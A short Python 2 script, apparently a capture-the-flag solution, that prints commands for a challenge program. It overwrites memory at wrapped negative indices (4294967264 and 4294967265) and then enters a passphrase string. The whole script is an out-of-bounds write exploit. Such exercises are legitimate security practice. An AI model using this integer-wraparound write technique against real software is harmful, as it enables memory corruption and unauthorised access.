#!/usr/bin/python2

payload = [
    'c', '4294967264', '\x37',
    'c', '4294967265', '\x13',
] + [
    item for i, c in
    enumerate('Abrac4dabr4h0cuspocu5youv3done1t')
    for item in ('c', str(i), c)
]

print('\n'.join(payload))
print('h')
